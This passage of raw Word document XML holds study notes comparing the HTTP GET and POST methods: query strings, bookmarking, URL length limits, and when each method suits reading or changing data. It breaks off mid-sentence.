        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b/>
          <w:color w:val="3C3C3C"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005D17A7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b/>
          <w:color w:val="3C3C3C"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>GET and POST:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="3C3C3C"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005D17A7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="3C3C3C"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>http://java67.blogspot.in/2014/08/difference-between-post-and-get-request.html</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="3C3C3C"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="264" w:lineRule="atLeast"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Trebuchet MS" w:hAnsi="Trebuchet MS"/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Trebuchet MS" w:hAnsi="Trebuchet MS"/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>The GET Method</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="3C3C3C"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="3C3C3C"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>In GET method the data is sent as URL parameters that are usually strings of name and value pairs separated by ampersands (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="3C3C3C"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>). In general, a URL with GET data will look like this:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00B84F48" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId188" w:history="1">
        <w:r w:rsidR="00267DFA" w:rsidRPr="00DD6AF5">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F2F7FA"/>
          </w:rPr>
          <w:t>http://www.example.com/action.php?</w:t>
        </w:r>
        <w:r w:rsidR="00267DFA" w:rsidRPr="00DD6AF5">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
            <w:b/>
            <w:bCs/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>name</w:t>
        </w:r>
        <w:r w:rsidR="00267DFA" w:rsidRPr="00DD6AF5">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F2F7FA"/>
          </w:rPr>
          <w:t>=</w:t>
        </w:r>
        <w:r w:rsidR="00267DFA" w:rsidRPr="00DD6AF5">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
            <w:i/>
            <w:iCs/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>john</w:t>
        </w:r>
        <w:r w:rsidR="00267DFA" w:rsidRPr="00DD6AF5">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F2F7FA"/>
          </w:rPr>
          <w:t>&amp;</w:t>
        </w:r>
        <w:r w:rsidR="00267DFA" w:rsidRPr="00DD6AF5">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
            <w:b/>
            <w:bCs/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>age</w:t>
        </w:r>
        <w:r w:rsidR="00267DFA" w:rsidRPr="00DD6AF5">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F2F7FA"/>
          </w:rPr>
          <w:t>=</w:t>
        </w:r>
        <w:r w:rsidR="00267DFA" w:rsidRPr="00DD6AF5">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
            <w:i/>
            <w:iCs/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>24</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="264" w:lineRule="atLeast"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Trebuchet MS" w:hAnsi="Trebuchet MS"/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Trebuchet MS" w:hAnsi="Trebuchet MS"/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Advantages and Disadvantages of Using the GET Method</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="160"/>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t>Since the data sent by the GET method are displayed in the URL, it is possible to bookmark the page with specific query string values.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="160"/>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t>The GET method is not suitable for passing sensitive information such as the username and password, because these are fully visible in the URL query string as well as potentially stored in the client browser's memory as a visited page.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="160"/>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lastRenderedPageBreak/>
        <w:t>Because the GET method assigns data to a server environment variable, the length of the URL is limited. So, there is a limitation for the total data to be sent.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="315" w:lineRule="atLeast"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="3C3C3C"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="315" w:lineRule="atLeast"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="3C3C3C"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="264" w:lineRule="atLeast"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Trebuchet MS" w:hAnsi="Trebuchet MS"/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Trebuchet MS" w:hAnsi="Trebuchet MS"/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>The POST Method</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="space"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:line="315" w:lineRule="atLeast"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="3C3C3C"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="3C3C3C"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>In POST method the data is sent to the server as a package in a separate communication with the processing script. Data sent through POST method will not visible in the URL.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="264" w:lineRule="atLeast"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Trebuchet MS" w:hAnsi="Trebuchet MS"/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Trebuchet MS" w:hAnsi="Trebuchet MS"/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Advantages and Disadvantages of Using the POST Method</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="161"/>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t>It is more secure than GET because user-entered information is never visible in the URL query string or in the server logs.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="161"/>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t>There is a much larger limit on the amount of data that can be passed and one can send text data as well as binary data (uploading a file) using POST.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="161"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="315" w:lineRule="atLeast"/>
        <w:ind w:left="0"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="3C3C3C"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="3C3C3C"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Since the data sent by the POST method is not visible in the URL, so it is not possible to bookmark the page with specific query.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="315" w:lineRule="atLeast"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="3C3C3C"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="315" w:lineRule="atLeast"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B25B45">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="yellow"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">But, even if you are not following </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B25B45">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="yellow"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>RESTful</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B25B45">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="yellow"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> principles, it can be useful to think in terms of using GET for retrieving / viewing information and POST for creating / editing information.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="315" w:lineRule="atLeast"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00512B4D">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="yellow"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>You should never use GET for an operation which alters data. If a search engine crawls a link to your evil op, or the client bookmarks it could spell big trouble.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00FA221E"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highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA221E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>Use GET if you don't mind the request being repeated (That is it doesn't change state).</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sidRPr="00FA221E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>Use POST if the operation does change the system's state.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="009266A3" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="240" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009266A3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>GET: Usually used for submitted search requests, or any request where you want the user to be able to pull up the exact page again.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="009266A3" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="240" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009266A3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Advantages of GET:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="009266A3" w:rsidRDefault="00267DFA" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="162"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="120" w:line="293" w:lineRule="atLeast"/>
        <w:ind w:left="450"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009266A3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>URLs can be bookmarked safely.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="009266A3" w:rsidRDefault="00267DFA" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="162"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:ind w:left="450"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009266A3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Pages can be reloaded safely.</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Advantages of POST:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="163"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="120" w:line="293" w:lineRule="atLeast"/>
        <w:ind w:left="450"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve">Name-value pairs are not displayed in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>. (Security += 1)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="163"/>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Unlimited number of name-value pairs can be passed via POST.</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Disadvantages of POST:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="164"/>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Page that used POST data cannot be bookmark. (If you so desired.)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:ind w:left="450"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00C86C93" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>The first important thing is the</w:t>
      </w:r>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>meaning</w:t>
      </w:r>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C86C93">
        <w:rPr>
